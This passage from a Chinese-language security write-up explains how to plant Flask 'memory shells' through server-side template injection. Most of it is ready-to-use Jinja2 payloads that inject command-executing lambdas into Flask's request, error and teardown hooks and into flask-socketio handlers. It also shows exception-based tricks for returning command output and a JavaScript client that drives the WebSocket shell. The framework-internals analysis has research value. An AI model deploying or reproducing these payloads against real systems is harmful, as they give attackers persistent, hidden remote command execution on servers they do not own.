app.error_handler_spec[None][app._get_exc_class_and_code(404)[1]][app._get_exc_class_and_code(404)[0]] = lambda c: __import__('os').popen(request.args.get('cmd')).read() if 'cmd' in request.args.keys() else app.backup_errfunc(c)
", 
{'request':url_for.__globals__['request'], 'app':url_for.__globals__['current_app']}) }}
```
```python
{{ url_for.__globals__['__builtins__']['exec'](
"
app.error_handler_spec[None][404][app._get_exc_class_and_code(404)[0]] = lambda c: __import__('os').popen(request.args.get('cmd')).read() if 'cmd' in request.args.keys() else c
", 
{'request':url_for.__globals__['request'], 'app':url_for.__globals__['current_app']}) }}
```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1717768797722-dbe2ba39-0b71-452e-8b2d-2aebfb0248d9.png#averageHue=%23f7f6b8&clientId=u15af632c-5e6d-4&from=paste&height=370&id=u753c60d0&originHeight=462&originWidth=1009&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=60126&status=done&style=none&taskId=uf2cee54e-602c-4959-9ebd-5a688e6eae2&title=&width=807.2)
### @app.url_value_preprocessor
这个装饰器用于注册一个函数，该函数会在请求解析URL参数之前调用，可以用于预处理URL参数。其最终操作的数据是`url_value_preprocessors`，在处理请求的时候，函数`flask.app.Flask.preprocess_request`先对遍历了它来直接调用对应的函数，并且这个没有对函数的返回值进行处理，也就是无回显，是对全局生效。
```python
@app.url_value_preprocessor
def url_preprocessor(endpoint, values):
    ...
```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1717769845043-4a95ac65-c495-47f7-a3ca-c64315854c8b.png#averageHue=%231f2024&clientId=u15af632c-5e6d-4&from=paste&height=580&id=u37afdc72&originHeight=725&originWidth=1164&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=106929&status=done&style=none&taskId=uca1b5444-ba89-4d9e-b6f7-5b407ed6457&title=&width=931.2)
如果我们要实现的内存马的需要考虑回显的问题，如果是在 Debug 模式开启的情况下，直接制造异常，在异常信息中输出，如果是非 Debug 模式看能否出网，出网反弹shell，不出网就添加新的路由以及修改配置。
这种方法是针对的全局路由并且无回显，所以不想影响到其他路由先判断一下。
```python
{{ url_for.__globals__['__builtins__']['eval'](
"
app.url_value_preprocessors[None].append(lambda ep, args : __import__('os').popen(request.args.get('cmd')) if 'cmd' in request.args.keys() else None)
", 
{'request':url_for.__globals__['request'], 'app':url_for.__globals__['current_app']}) }}
```

**无回显的解决方法**
#### 2.1 Debug模式抛出异常
利用异常来抛出回显，Python lambda 表达式中是不能直接`raise Exception`或者`try-except`可以使用下面的方法来在 lambda 表达式抛出异常，如果是在实战中的，异常可能会被日志记录。
[Just a moment...](https://stackoverflow.com/questions/8294618/define-a-lambda-expression-that-raises-an-exception)

##### 2.1.1 方法一
创建一个生成器对象，调用throw方法来引发异常
```python
lambda : (_ for _ in ()).throw(Exception('this is a tuple exception 11'))
lambda : [][_ for _ in ()].throw(Exception('this is a list exception'))
lambda : {_: _ for _ in ()}.values().__iter__().throw(Exception('this is a dict exception'))
```
```python
{{ url_for.__globals__['__builtins__']['eval'](
"
app.url_value_preprocessors[None].append(lambda ep, args: (_ for _ in ()).throw(Exception(__import__('os').popen(request.args.get('cmd')).read())) if 'cmd' in request.args.keys()  else None)
", 
{'request':url_for.__globals__['request'], 'app':url_for.__globals__['current_app']}) }}
```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1717772515182-e0beb2e5-71ed-4357-9670-9427a58a443a.png#averageHue=%23deb77a&clientId=u15af632c-5e6d-4&from=paste&height=375&id=u69650e88&originHeight=469&originWidth=1017&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=53828&status=done&style=none&taskId=ua61db88d-309a-4478-95f3-953dff348e8&title=&width=813.6)

##### 2.1.2 方法二
通过一定会抛出异常的错误表达式来强行抛出异常，选择可以回显的
```python
lambda : 1/0
lambda : [][0]
lambda : {}['8sd***r']
lambda : int('aaa') # 回显有长度限制
lambda : float('aaa')
lambda : getattr(object, 'nonexistent_attribute')
```
```python
{{ url_for.__globals__['__builtins__']['eval'](
"
app.url_value_preprocessors[None].append(lambda ep, args : {}[__import__('os').popen(request.args.get('cmd')).read()]  if 'cmd' in request.args.keys() else None)
", 
{'request':url_for.__globals__['request'], 'app':url_for.__globals__['current_app']}) }}
```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1717772727950-ffa61216-628b-4806-a0d7-9e44424b60ea.png#averageHue=%23d7a868&clientId=u15af632c-5e6d-4&from=paste&height=497&id=uea7e8f58&originHeight=621&originWidth=1170&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=131038&status=done&style=none&taskId=u31911d3b-b0d2-4bf9-afe8-4e85198a692&title=&width=936)

##### 2.1.3 方法三
通过exec执行语句
```python
lambda : exec('raise(Exception("this is an exception"))')
```
```python
{{ url_for.__globals__['__builtins__']['eval'](
"
app.url_value_preprocessors[None].append(lambda ep, args: exec('raise(Exception(__import__(\'os\').popen(request.args.get(\'cmd\')).read()))') if 'cmd' in request.args.keys() is not None else None)
", 
{'request':url_for.__globals__['request'], 'app':url_for.__globals__['current_app']}) }}
```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1717772968453-75fd8739-e3bc-46f0-adab-3c53bf3c46f8.png#averageHue=%23deba7e&clientId=u15af632c-5e6d-4&from=paste&height=373&id=ua4804f9d&originHeight=466&originWidth=1036&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=55119&status=done&style=none&taskId=ue183bb2f-61f3-4902-a2d2-ef209d8d459&title=&width=828.8)

##### 2.1.4 方法四
老外写的这个挺骚的，但是没有找到回显的地方，看了下的他的实现思路，感觉可以找一个能爆出参数值的异常的函数去搞。__code__：表示编译后的函数体的代码对象。可以用来调用函数
```python
lambda :  type(lambda:0)(type((lambda:0).func_code)(
  1,1,1,67,'|\0\0\202\1\0',(),(),('x',),'','',1,''),{}
)(Exception())
```
```python
lambda : type(lambda: 0)(type((lambda: 0).__code__)(
    1,0,1,1,67,b'|\0\202\1\0',(),(),('x',),'','',1,b''),{}
)(Exception())

lambda : type(lambda: 0)(type((lambda: 0).__code__)(
    1,0,1,1,67,b'|\0\202\1',(),(),('x',),'','',1,b''),{}
)(Exception)
```
#### 2.2 非Debug模式
##### 2.2.1 注册路由
参照上面
##### 2.2.2 反弹shell
##### 2.2.3 异常处理
如果在无回显的非 Debug 模式下依然使用抛出异常的方法的会发现页面返回的是`500`错误。从 Flask 的处理流程里看，首先会在`**wsgi_app()**`自动推送请求上下文，接着调用`full_dispatch_request()`分派请求，并在此基础上执行请求预处理和后处理以及 HTTP 异常捕获和错误处理。
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1717847940813-a8866a2d-1115-4c6b-a6b2-c4ad890751ea.png#averageHue=%231f2125&clientId=u8309ad53-fa41-4&from=paste&height=512&id=ucae21af1&originHeight=640&originWidth=984&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=89537&status=done&style=none&taskId=u9d31e5fa-b69d-4357-ab48-8f3e5f185dc&title=&width=787.2)
这里对处理请求的过程进行了异常包裹，如果出现异常，会将异常传递给`handle_exception()`，在官方的解释为_处理没有关联错误处理程序的异常，或者从错误处理程序引发的异常。这总是会导致 _`_500_`_。_同时还有如下说明：
> Flask will suppress any server error with a generic error page unless it is in debug mode. As such to enable just the interactive debugger without the code reloading, you have to invoke [run()](https://flask.palletsprojects.com/en/3.0.x/api/#flask.Flask.run) with debug=True and use_reloader=False. Setting use_debugger to True without being in debug mode won’t catch any exceptions because there won’t be any to catch.
Flask 将使用通用错误页面抑制任何服务器错误，除非处于调试模式。因此，要仅启用交互式调试器而不重新加载代码，您必须使用 debug=True 和 use_reloader=False 调用 **run()** 。在不处于调试模式的情况下将 use_debugger 设置为 True 不会捕获任何异常，因为不会捕获任何异常。

这也说明了为什么能够在 Debug 模式会有非`500`的异常回显。先看一下如果是一个`404`错误在 Flask 中是如何处理的。在 `app.py`中最后断点，这里是由 werkzeug 调用的。
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1717848198698-628c9e4d-1d63-492e-89aa-8acc47d48c5c.png#averageHue=%23202126&clientId=u8309ad53-fa41-4&from=paste&height=157&id=u7e1d46d4&originHeight=196&originWidth=962&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=33161&status=done&style=none&taskId=ufec64663-e51e-4a65-a8ef-d446a154264&title=&width=769.6)
从`wsgi_app()`进入到`full_dispatch_request()`中，这里调用了`preprocess_request()`预处理请求函数，同时也是在这个函数里实现了利用`@app.url_value_preprocessor`路由来作为内存马的方法，也就是这个调用中内存马抛出了异常。出现异常后会直接调用`handle_user_exception()`函数来进行处理。
> **handle_user_exception**(_e_)
处理用户异常(e) ¶
每当发生需要处理的异常时，就会调用此方法。一个特殊情况是 **HTTPException** ，它被转发到 **handle_http_exception()** 方法。此函数将返回响应值或使用相同的回溯重新引发异常。

![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1717848544633-30a3850d-1449-4606-b4e9-211260d580bc.png#averageHue=%231f232a&clientId=u8309ad53-fa41-4&from=paste&height=384&id=u992da40c&originHeight=480&originWidth=1044&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=76595&status=done&style=none&taskId=uc4dc6a14-b8db-49c0-90c7-45d1a3df920&title=&width=835.2)
可以看到这个时候触发的异常是`<NotFound '404: Not Found'>`，如果是利用内存马来抛出的异常的话就是
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1717849003724-9aea12d3-f552-44c6-b517-face77a506c1.png#averageHue=%23202632&clientId=u8309ad53-fa41-4&from=paste&height=183&id=u3a176b50&originHeight=229&originWidth=1829&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=47208&status=done&style=none&taskId=ucca631ce-493e-4f7d-b4f7-6c28fc69b3c&title=&width=1463.2)
接着进入到用户异常处理函数，这里先判断异常是否为`HTTPException`，如果是的话就使用`handle_http_exception()`处理否则会去查找有没有为这个异常定义处理函数，如果没有就会抛出。
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1717848730966-c362c46a-0da1-4690-b57e-419aa305b9aa.png#averageHue=%231f2127&clientId=u8309ad53-fa41-4&from=paste&height=649&id=u52ba944b&originHeight=811&originWidth=1112&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=120067&status=done&style=none&taskId=uf3537fa9-0af3-4fc2-8b0f-878044c4e75&title=&width=889.6)
其实跟到这里就有一些找到回显的方法了，一个是为内存马抛出的异常定义处理函数，一个就是定义内存马抛出的异常类型。
比如这样实现，在为`500`错误注册了处理函数后，通过通过在非 Debug 模式下抛出异常。啊，一点都不优雅
```python
{{ url_for.__globals__['__builtins__']['exec'](
"
app.error_handler_spec[None][500][app._get_exc_class_and_code(500)[0]] = lambda c: __import__('os').popen(request.args.get('cmd')).read() if 'cmd' in request.args.keys() else c;
app.url_value_preprocessors[None].append(lambda ep, args: (_ for _ in ()).throw(Exception) if 'cmd' in request.args.keys()  else None)
", 
{'request':url_for.__globals__['request'], 'app':url_for.__globals__['current_app']}) }}
```
又比如定义内存马抛出的异常类型为`HTTPException`，这样就可以定义异常的类型了，这里定义为`404``200`都可以，~~前提是你能够触发~~。
```python
{{ url_for.__globals__['__builtins__']['exec'](
"
he=ufg['HTTPException'];he.code=404;
app.url_value_preprocessors[None].append(
lambda ep, args: (_ for _ in ()).throw(he(description=__import__('os').popen(request.args.get('cmd')).read())) if 'cmd' in request.args.keys() is not None else None
)
", 
{'request':url_for.__globals__['request'], 'ufg': url_for.__globals__, 'app':url_for.__globals__['current_app']}) }}
```
这里定义的`404`，效果如下：因为`lambda`函数里判断是否执行内存马，所以不会影响其他，只有在执行的时候抛出一个`404`异常，然后这个时候就可以经过上面提到的对异常类型的判断。这里是一个`HTTPException`异常后就能够正常的回显了。并且这里这个路由存不存在都没关系。
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1717849269293-a9e1ac11-b2c8-45de-8a3d-42347030ecba.png#averageHue=%23b5dbd3&clientId=u8309ad53-fa41-4&from=paste&height=506&id=u62f23483&originHeight=632&originWidth=1179&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=91143&status=done&style=none&taskId=ubf1b921e-4849-4788-81e1-cfd4194426c&title=&width=943.2)

其实在做这里的时候，对于异常的处理这块还想了一些其他的方法，比如打开 `debug`，做过之后发现是能够修改的，但是修改了也没用，在文件里打开的时候，flask 应用的启动是通过werkzeug中的debug来启动的。还有就是想到了修改`500`错误的回显，这个报错`TypeError: 'mappingproxy' object does not support item assignment`是不允许修改的。

### @app.before_request
这个装饰器用于注册一个函数，该函数会在每次请求之前执行。它常用于在处理请求之前进行一些预处理操作，如验证用户身份、设置全局变量等。最终操作的数据是`before_request_funcs`，这个装饰器可以有多个，按照注册顺序调用。可以通过`url_for.__globals__['current_app'].__dict__['before_request_funcs']`查看有哪些。在处理请求的时候，函数`flask.app.Flask.preprocess_request`先对url进行预处理后对请求进行预处理。
```python
@app.before_request
def first_before_request():
    ...
```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1717769618486-b44c2df2-e17c-48e6-a277-b231873d13bf.png#averageHue=%23edf0f4&clientId=u15af632c-5e6d-4&from=paste&height=292&id=ucfe85f17&originHeight=365&originWidth=1880&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=74558&status=done&style=none&taskId=u55d8143d-6da6-4da9-886a-2f90d62ad11&title=&width=1504)
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1717851507177-26eb95d0-c64d-48a7-ae6a-e49010ce5992.png#averageHue=%231f2024&clientId=ue331e04d-0d85-4&from=paste&height=577&id=u279e13d8&originHeight=721&originWidth=1156&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=104735&status=done&style=none&taskId=ud033bcf2-8571-4ed0-b3ae-e396a03e242&title=&width=924.8)
Payload 如下
```python
{{ url_for.__globals__['__builtins__']['eval'](
"
app.before_request_funcs.setdefault(None, []).append(lambda : '<pre>{0}</pre>'.format(__import__('os').popen(request.args.get('cmd')).read()) if 'cmd'in request.args.keys() is not None else None
)
", 
{'request':url_for.__globals__['request'], 'app':url_for.__globals__['current_app']}) }}
```
### @app.after_request
这个装饰器用于注册一个函数，该函数会在每次请求之后调用，通常用于修改响应对象。其最终操作的数据为`after_request_funcs`，当一个请求在返回之前会传入一个`Response`调用`process_response`函数来对响应进行处理。定义的处理函数需要接收一个`Response`对象处理后返回`Response`对象。
> 在版本 1.1.0 中进行了更改：当没有处理程序时，即使对于默认的 500 响应，也会完成 after_request 函数和其他终结。

```python
@app.after_request
def after_request_func(response):
    response.headers['X-Something'] = 'A value'
    return response
```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1717853971281-21b20610-e4d5-4d31-82bb-df731c26c334.png#averageHue=%231f2024&clientId=ue331e04d-0d85-4&from=paste&height=605&id=u42fbd34b&originHeight=756&originWidth=1329&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=130422&status=done&style=none&taskId=u619438c7-3553-438e-b054-3b4e846dfb6&title=&width=1063.2)
Payload如下
```python
{{ url_for.__globals__['__builtins__']['eval'](
"
app.after_request_funcs.setdefault(None, []).append(lambda resp: ufg['Response']('<pre>{0}</pre>'.format(__import__('os').popen(request.args.get('cmd')).read())) if 'cmd'in request.args.keys() is not None else resp)
", 
{'request':url_for.__globals__['request'], 'ufg': url_for.__globals__, 'app':url_for.__globals__['current_app']}) }}
```
### @app.teardown_request
这个装饰器用于注册一个函数，该函数会在每次请求结束后调用，无论请求是否成功。拆卸函数的返回值将被忽略。在请求结束后`do_teardown_request`函数会被调用。这个函数的也是没有回显的，所以可参考前面说到的方法。
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1717855372681-82fc0dac-aa6b-4db1-9dd9-d992ac4bcf78.png#averageHue=%23202327&clientId=ue331e04d-0d85-4&from=paste&height=289&id=uf1b1767b&originHeight=361&originWidth=1239&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=62912&status=done&style=none&taskId=ueae72a91-4ee3-4757-9c0e-0f68be888fc&title=&width=991.2)
```python
{{ url_for.__globals__['__builtins__']['eval'](
"
app.teardown_request_funcs.setdefault(None, []).append(lambda exc:  __import__('os').popen(request.args.get('cmd')) if 'cmd' in request.args.keys() else None)
", 
{'request':url_for.__globals__['request'], 'ufg': url_for.__globals__, 'app':url_for.__globals__['current_app']}) }}
```
### @app.context_processor
这个装饰器用于注册一个上下文处理器，该处理器返回的字典将合并到模板上下文中。最终操作的数据是`template_context_processors`，具体用法参考：[https://developer.aliyun.com/article/1196915](https://developer.aliyun.com/article/1196915) 直接点说就是用它来注册在模板中使用的变量，当模板渲染的时候会自动调用这个函数得到一个字典。然后用字典里面的变量去替换模板中的内容。所以作为内存马使用的话就比较局限了。由`update_template_context`函数来操作。
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1717856675530-7daaea6f-02a5-4beb-b287-fb67e4fb1de7.png#averageHue=%231f2226&clientId=ue331e04d-0d85-4&from=paste&height=396&id=uaf09c3d0&originHeight=495&originWidth=1011&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=74080&status=done&style=none&taskId=uf0fb073a-5a03-407b-a799-013aa2baf40&title=&width=808.8)
Payload如下，lambda函数里返回了一个字典，键值是`ak47`，要想拿到回显的话可以参考前面的内容，或者使在有 SSTI 的地方使用。貌似也可以配合模板操作的装饰器实现回显。
```python
{{ url_for.__globals__['__builtins__']['eval'](
"
app.template_context_processors[None].append(lambda : {'ak47': __import__('os').popen(request.args.get('cmd')).read() if 'cmd'in request.args.keys() is not None else None})
", 
{'request':url_for.__globals__['request'], 'ufg': url_for.__globals__, 'app':url_for.__globals__['current_app']}) }}
```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1717856783079-a644a043-85bb-4cb7-870d-7374d840a30b.png#averageHue=%23edf0f4&clientId=ue331e04d-0d85-4&from=paste&height=257&id=u24ada709&originHeight=321&originWidth=1757&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=66035&status=done&style=none&taskId=u9181779f-9480-493e-a4c0-e997b976c24&title=&width=1405.6)
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1717856823009-756310a1-63b3-4c04-bca9-78c51ee87b24.png#averageHue=%237aa9c5&clientId=ue331e04d-0d85-4&from=paste&height=306&id=u0be1678c&originHeight=382&originWidth=1887&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=134599&status=done&style=none&taskId=u2fe3e9cf-4146-4d0e-83ce-32d221d8ece&title=&width=1509.6)
### @app.teardown_appcontext
装饰器标记的函数会在每次应用环境销毁时调用。操作的数据是`teardown_appcontext_funcs`，在请求结束销毁的时候由`do_teardown_appcontext()`函数调用，所以就很特殊，在这里调用的时候请求上下文已经消失获取不到上下文包括传递的url参数，也就无法控制内存马，但是依然可以命令执行，不过在每次请求的时候都会被调用。所以要么配合其他装饰器在这个装饰器的函数调用之前，将`request`对象保存到 Flask 的全局变量 `g`中，然后再拿到参数。
```python
{{ url_for.__globals__['__builtins__']['exec'](
"
g=ufg['g']
app.teardown_request_funcs.setdefault(None, []).append(lambda exc: exec('g.saved = {\'path\':request.path, \'args\':request.args}') );
app.teardown_appcontext_funcs.append(lambda exc: __import__('os').popen(g.saved['args'].get('cmd')) if '/shell'==g.saved['path'] else exc ) 
", 
{'request':url_for.__globals__['request'], 'ufg': url_for.__globals__, 'app':url_for.__globals__['current_app']}) }}
```
属于是脱裤子放屁了。没有回显。只有访问`/shell?cmd=calc`才会执行。回显问题依然参考前面的抛出异常啥的。这个可以弄`404`的。
# WebSocket内存马
没法实现，一个是flask框架本身没有对websocket的支持，
[https://www.cnblogs.com/tianyiliang/p/17544455.html](https://www.cnblogs.com/tianyiliang/p/17544455.html)
[https://mp.weixin.qq.com/s/_hNrF2zKb7qFKBMXnf3kfA](https://mp.weixin.qq.com/s/_hNrF2zKb7qFKBMXnf3kfA)
[https://www.liujiangblog.com/course/python/77](https://www.liujiangblog.com/course/python/77)
[https://www.cnblogs.com/fishou/p/4175732.html](https://www.cnblogs.com/fishou/p/4175732.html)
[https://worktile.com/kb/ask/21407.html](https://worktile.com/kb/ask/21407.html)
基于socket实现websocket服务 [https://blog.csdn.net/difu0201/article/details/101582682](https://blog.csdn.net/difu0201/article/details/101582682)
[https://www.cnblogs.com/lujiacheng-Python/p/10293830.html](https://www.cnblogs.com/lujiacheng-Python/p/10293830.html)

[https://cloud.tencent.com/developer/article/1887095](https://cloud.tencent.com/developer/article/1887095)


```python
# ws路由句柄
url_for.__globals__.current_app.extensions['socketio'].server.handlers

url_for.__globals__.current_app.extensions['socketio'].server.handlers['/shellws']= {'shell': lambda j: print(123123)} 

app.extensions['socketio'].server.handlers['/chat']['join']=lambda e,d: __import__('os').popen('calc')
lambda e,d: __import__('os').popen('calc')

handler=lambda e,d: __import__('os').popen('calc')



{{ url_for.__globals__['__builtins__']['exec'](
"
app.extensions['socketio'].server.handlers['/wsshell'] = {};
app.extensions['socketio'].server.handlers['/wsshell']['shell']=lambda e,d: __import__('os').popen('calc')
", 
{'app':url_for.__globals__['current_app']})
}}



{{ url_for.__globals__['__builtins__']['exec'](
"
app.extensions['socketio'].server.handlers['/wsshell'] = {'shell':lambda e,d: __import__('os').popen('calc')}
", 
{'app':url_for.__globals__['current_app']})
}}
```
## Flask-socketio
由于 Flask 本身并不支持 websocket，只能通过第三方扩展如基于 socketio 开发的 flask-socketio实现，还有一些花里胡哨的实现方法，在弄这个的时候想了一些办法来实现 websocket 的内存马。
一种是如果端口能开放，使用 socket 实现一个伪 websocket，但是实际没有啥用。
第二种就是这个 web 应用使用了扩展来支持 websocket，这里用 flask-socketio 来演示一下。它的基本用法如下，使用`@socketio.on`装饰器，可以通过 namespace 来准许客户端在同一个 socket 上建立多个独立的链接；even_name 代表事件名称，可以自己定义，同时客户端连接的时候需要指定事件发送消息。
```python
from flask_socketio import SocketIO
socketio = SocketIO(app, cors_allowed_origins="*")

@socketio.on('event_name', namespace='/namespace')
def func_name(message):
    send({'msg': 'message info'})

socketio.run(app)
```
客户端的用法
```javascript
// 连接WebSocket
var socket = io.connect('http://domain:port/namespace');

function sendMsg() {
    socket.emit('event_name', {'msg': 'message info'});
}

// 接收消息事件
socket.on('message', function(data) {
    var p = document.createElement('p');
    p.innerHTML = data['msg'];
    document.getElementById('chat').appendChild(p);
});
```
具体用法参考：
[Flask-SocketIO — Flask-SocketIO documentation](https://flask-socketio.readthedocs.io/en/latest/)
[flask-socketio-doc-zh/Flask-SocketIO中文文档.md at master · shenyushun/flask-socketio-doc-zh](https://github.com/shenyushun/flask-socketio-doc-zh/blob/master/Flask-SocketIO%E4%B8%AD%E6%96%87%E6%96%87%E6%A1%A3.md)
`@socketio.on`装饰器在服务端注册事件处理函数，实现如下：
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1718006831868-9658fc3d-9894-453f-98bf-eae28044c427.png#averageHue=%231f2124&clientId=u82fbda9c-3c32-4&from=paste&height=366&id=u24c8b784&originHeight=457&originWidth=1165&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=66940&status=done&style=none&taskId=uaadc9aee-66a1-4665-86fd-ea9d93fe2d3&title=&width=932)
在通过 HTTP 升级协议到 websocket 建立连接后，当触发事件的时候，通过`_handle_event_internal`调用`_trigger_event`，进而找到事件处理函数并传递数据，寻找事件处理函数的过程和 flask 里的路由处理函数一样，通过事件名在`socketio.server.handlers`属性里找到对应的函数。
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1718007155420-f5ef6155-04bc-4656-9149-32a74cfdc8d6.png#averageHue=%2320242b&clientId=u82fbda9c-3c32-4&from=paste&height=429&id=u1be5edc1&originHeight=536&originWidth=1056&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=91080&status=done&style=none&taskId=u247d2568-583c-421b-a639-5d1d9acfe35&title=&width=844.8)
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1718007303036-c9e6ba1d-ddc0-4055-8218-7f322853a929.png#averageHue=%23202125&clientId=u82fbda9c-3c32-4&from=paste&height=558&id=u9bc3ba61&originHeight=697&originWidth=884&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=112603&status=done&style=none&taskId=u67daf25f-afd6-4aac-8735-b6ef50d9fc1&title=&width=707.2)
这个 `handlers`可以通过`url_for.__globals__.current_app.extensions['socketio'].server.handlers`来查看。函数在调用的时候会传递一个两个参数，一个`request.sid`一个就是客户端发送的消息。
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1718007506493-daa6e36a-b9d9-4cee-9d9c-03f580f3d6cd.png#averageHue=%23edf0f4&clientId=u82fbda9c-3c32-4&from=paste&height=227&id=u0a0d74b6&originHeight=284&originWidth=1867&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=75536&status=done&style=none&taskId=u8567e0d3-49b5-4ec5-9fa1-6b5639a5267&title=&width=1493.6)
```python
{'/namespace': {'event_name': <function >}}
```
所以要实现 websocket 内存马只需要往里面添加即可实现。
## ws连接过程
先看一下一个正常的ws请求在 flask-socketio 中是怎么接收处理后发送消息的。上面已经说过找到对应事件处理函数的过程，在拿到事件处理函数后，会在这里进行调用。
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1718023504468-4d291253-4004-4e1c-bb17-27d7360f5b71.png#averageHue=%2320252d&clientId=u82fbda9c-3c32-4&from=paste&height=269&id=u1cc8e46c&originHeight=336&originWidth=1136&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=60329&status=done&style=none&taskId=ucdd61712-dce5-48df-972b-3474b2d504e&title=&width=908.8)
但是需要注意的是这里并不是直接调用函数，在`@socketio.on`装饰器装饰事件处理函数的时候使用了Python functools包中的`@wraps(handler)`来对事件处理函数再次进行了装饰，这个也就是在上面调用`handler()`函数的时候调用的是下图中的`_handler()`
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1718023579617-324e7117-6118-4509-9b77-9bdff293cdfa.png#averageHue=%23222732&clientId=u82fbda9c-3c32-4&from=paste&height=207&id=ub1a0f868&originHeight=259&originWidth=1401&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=56609&status=done&style=none&taskId=ua8d46f89-8d5c-473e-b9b3-e4e8165c9f4&title=&width=1120.8)
这个函数里调用`_handle_event()`，这个方法由`flask_socketio.SocketIO`对象提供，在这里去获取了 flask 应用上下文，然后调用真正的事件处理函数`handler()`
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1718023874611-c4b79158-967e-4c3f-a218-8cfba6bb6c44.png#averageHue=%23202229&clientId=u82fbda9c-3c32-4&from=paste&height=530&id=ue56ad16a&originHeight=662&originWidth=1417&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=106949&status=done&style=none&taskId=u139aef88-42d3-49a8-a51a-0c2ab21e0c1&title=&width=1133.6)
如果需要在事件处理函数中需要发送消息给客户端，这里使用的是`flask_socketio.send`方法来发送消息。其最终调用的是`flask_socketio.SocketIO.send`方法，这里其实也不是最终的调用方法，因为 flask-socketio 是基于 sokcetio 开发的，后续就是 socketio 的处理了。这里还有一点是，这里调用的时候，是通过获取 flask 的应用上下文来获取加载的扩展对象，然后才能够调用。
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1718024013636-42ea497a-fd8b-4308-9346-06ed7cca3279.png#averageHue=%231f2125&clientId=u82fbda9c-3c32-4&from=paste&height=462&id=u9eb9f45d&originHeight=577&originWidth=1004&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=101111&status=done&style=none&taskId=u470a1c85-f2e4-4ab8-bf6f-aed898965d3&title=&width=803.2)
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1718024256953-eda728c3-ee48-43d6-96fd-2cf06a8cd322.png#averageHue=%23212831&clientId=u82fbda9c-3c32-4&from=paste&height=231&id=u825b7199&originHeight=289&originWidth=1010&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=65276&status=done&style=none&taskId=uaae55734-4693-4a8b-9855-f4d7ce286f7&title=&width=808)

## ws内存马实现
接下来实现一下上面的连接过程，场景是有一个 SSTI 漏洞。使用下面这个 Payload 来添加一个自定义的 websocket 事件处理函数，命名空间为`/wsshell`，事件名为`shell`，事件函数需要的参数上面也有提到：e为`request sid`，d为客户端发送的数据。
```python
{{ url_for.__globals__['__builtins__']['exec'](
"
app.extensions['socketio'].server.handlers['/wsshell'] = {'shell':lambda e,d: __import__('os').popen(d['cmd']).read()}
", 
{'app':url_for.__globals__['current_app']})
}}
```
客户端的实现
```javascript
var socket = io.connect('http://127.0.0.1:5000/wsshell');

function execCMD() {
  socket.emit('shell', { 'cmd': document.getElementById('cmdline').value});
}

// 接收消息事件
socket.on('message', function(data) {
  var p = document.createElement('p');
  p.innerHTML = data['msg'];
  document.getElementById('chat').appendChild(p);
});
```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1718024665322-65931378-8796-419e-ac78-6042a165a738.png#averageHue=%2312640e&clientId=u82fbda9c-3c32-4&from=paste&height=831&id=ue8c94317&originHeight=1039&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=109075&status=done&style=none&taskId=u280644be-73a7-4732-894a-1d91b2313d7&title=&width=1536)
成功发送了消息并执行了命令，但是服务端并没有返回数据。如果需要返回数据还得继续改造 Payload，那么就应该在匿名函数将命令执行结果作为参数传递给 `send`方法
